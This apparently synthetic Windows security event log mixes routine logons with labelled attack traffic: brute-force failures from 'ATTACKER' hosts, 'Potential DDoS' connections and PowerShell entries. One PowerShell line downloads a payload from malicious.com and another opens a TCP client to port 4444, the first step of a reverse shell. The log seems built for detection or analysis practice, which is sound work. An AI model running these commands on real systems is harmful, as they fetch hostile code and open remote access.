2025-05-16 00:01:00, Info, CBS, EventID: 4624, TargetUserName: Administrator, IpAddress: 127.0.0.1, WorkstationName: SRV01, ProcessName: -, EventDescription: Successful Logon (Local), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:01, Error, CBS, EventID: 4625, TargetUserName: Administrator, IpAddress: 192.168.1.100, WorkstationName: ATTACKER-WK01, ProcessName: -, EventDescription: Failed Logon Attempt (Invalid Password), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:02, Error, CBS, EventID: 4625, TargetUserName: Guest, IpAddress: 172.16.0.50, WorkstationName: REMOTE-PC01, ProcessName: -, EventDescription: Failed Logon Attempt (Account Disabled), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:03, Info, CSI, EventID: 4104, TargetUserName: IEUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, EventDescription: PowerShell Script Execution, ScriptContent: Get-Service | Where-Object {$_.Status -eq 'Running'}, SourcePort: -, DestinationPort: -
2025-05-16 00:01:04, Warning, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.200, WorkstationName: BOTNET-PC01, ProcessName: -, EventDescription: Network Connection (Potential DDoS), ScriptContent: -, SourcePort: 54321, DestinationPort: 80
2025-05-16 00:01:05, Info, CBS, EventID: 1, TargetUserName: IEUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\explorer.exe, EventDescription: Sysmon Process Create, ScriptContent: C:\Windows\explorer.exe, SourcePort: -, DestinationPort: -
2025-05-16 00:01:06, Warning, CSI, EventID: 4104, TargetUserName: IEUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, EventDescription: PowerShell Script Execution, ScriptContent: Invoke-WebRequest -Uri http://malicious.com/payload.ps1 -OutFile C:\Temp\payload.ps1, SourcePort: -, DestinationPort: -
2025-05-16 00:01:07, Info, CBS, EventID: 4624, TargetUserName: LocalUser, IpAddress: 192.168.1.20, WorkstationName: WKSTN02, ProcessName: -, EventDescription: Successful Logon (Network), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:08, Error, CBS, EventID: 4625, TargetUserName: TestUser, IpAddress: 203.0.113.10, WorkstationName: ATTACKER-WK02, ProcessName: -, EventDescription: Failed Logon Attempt (Invalid Username), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:09, Warning, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.201, WorkstationName: BOTNET-PC02, ProcessName: -, EventDescription: Network Connection (Potential DDoS), ScriptContent: -, SourcePort: 54322, DestinationPort: 80
2025-05-16 00:01:10, Warning, CSI, EventID: 4104, TargetUserName: TestUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, EventDescription: PowerShell Script Execution, ScriptContent: New-Object System.Net.Sockets.TCPClient('192.168.1.2',4444), SourcePort: -, DestinationPort: -
2025-05-16 00:01:11, Info, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.10, WorkstationName: WKSTN01, ProcessName: -, EventDescription: Network Connection (HTTP Request), ScriptContent: -, SourcePort: 54323, DestinationPort: 80
2025-05-16 00:01:12, Error, CBS, EventID: 4625, TargetUserName: Administrator, IpAddress: 192.168.1.100, WorkstationName: ATTACKER-WK01, ProcessName: -, EventDescription: Failed Logon Attempt (Invalid Password), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:13, Info, CBS, EventID: 4624, TargetUserName: IEUser, IpAddress: 192.168.1.10, WorkstationName: WKSTN01, ProcessName: -, EventDescription: Successful Logon (Network), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:14, Info, CSI, EventID: 4104, TargetUserName: IEUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, EventDescription: PowerShell Script Execution, ScriptContent: Invoke-Command -ScriptBlock {whoami} -ComputerName SRV02, SourcePort: -, DestinationPort: -
2025-05-16 00:01:15, Warning, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.200, WorkstationName: BOTNET-PC01, ProcessName: -, EventDescription: Network Connection (Potential DDoS), ScriptContent: -, SourcePort: 54324, DestinationPort: 80
2025-05-16 00:01:16, Error, CBS, EventID: 4625, TargetUserName: Guest, IpAddress: 172.16.0.50, WorkstationName: REMOTE-PC01, ProcessName: -, EventDescription: Failed Logon Attempt (Account Disabled), ScriptContent: -, SourcePort: -, DestinationPort: -
